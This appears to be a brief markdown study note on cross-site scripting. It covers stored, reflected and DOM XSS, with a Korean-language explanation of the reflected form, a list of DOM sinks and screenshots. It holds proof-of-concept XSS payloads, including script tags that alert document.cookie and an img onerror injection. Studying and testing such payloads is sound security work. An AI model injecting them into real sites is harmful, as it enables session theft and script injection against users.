# XSS
## Stored XSS
```html
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<script>print()</script>
<plaintext>
```
<img width="1106" height="94" alt="image" src="https://github.com/user-attachments/assets/d9fdaeb7-2eef-4bf8-9b50-1d10c952551f" />

## Reflected XSS
- 공격자가 악성 스크립트가 포함된 URL을 만들어 피해자에게 전달하면, 피해자가 해당 링크를 클릭했을 때 서버가 URL의 파라미터를 검증 없이 응답 페이지에 그대로 반영하여 스크립트가 실행
```html
<script>alert(window.origin)</script>
```
<img width="1414" height="94" alt="image" src="https://github.com/user-attachments/assets/e8ad87e9-20b1-4f92-83fc-284fc006087e" />

## DOM XSS
```html
document.write()
DOM.innerHTML
DOM.outerHTML
add()
after()
append()
```
```html
<img src="" onerror=alert(window.origin)>
```
